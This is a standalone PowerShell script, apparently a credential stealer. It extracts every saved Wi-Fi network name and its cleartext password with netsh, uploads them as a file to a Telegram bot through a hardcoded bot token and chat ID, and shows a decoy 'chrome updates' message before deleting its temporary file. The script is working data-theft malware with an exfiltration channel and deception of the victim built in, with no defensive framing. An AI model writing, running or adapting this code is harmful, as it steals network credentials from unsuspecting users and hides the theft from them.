$token  = "7949476577:AAEhTtcNtrtOPLI4G_fHR7am1jBBC0S4k_I"
$chatId = "7373222328"
$outputFile = "$env:TEMP\wifi_keys.txt"

# 1. Extract WiFi Names and Keys
$wifiData = netsh wlan show profiles | Select-String "\:(.+)$" | ForEach-Object {
    $name = $_.Matches.Groups[1].Value.Trim()
    $pass = netsh wlan show profile name="$name" key=clear | Select-String "Key Content\W+\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
    
    if ($pass) { "SSID: $name | Password: $pass" } 
    else { "SSID: $name | Password: [OPEN OR NOT FOUND]" }
}
$wifiData | Out-File -FilePath $outputFile -Encoding utf8

# 2. Send to Telegram (Enhanced PowerShell 5.1 Method)
$uri = "https://api.telegram.org/bot$token/sendDocument"

try {
    # We use the 'UploadMultipart' logic but via Invoke-RestMethod for better error reporting
    $fileBytes = [System.IO.File]::ReadAllBytes($outputFile)
    $fileName = [System.IO.Path]::GetFileName($outputFile)
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"

    $bodyLines = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"chat_id`"",
        "",
        $chatId,
        "--$boundary",
        "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"",
        "Content-Type: text/plain",
        "",
        [System.Text.Encoding]::Default.GetString($fileBytes),
        "--$boundary--"
    ) -join $LF

    Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
    
    Write-Host "cheking for chrome updates." -ForegroundColor Green
}
catch {
    
    $_.Exception.Message
    if ($_.Exception.Response) {
        $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
        Write-Host "Telegram says: $($reader.ReadToEnd())" -ForegroundColor Yellow
    }
}
finally {
    if (Test-Path $outputFile) { Remove-Item $outputFile }
}

exit
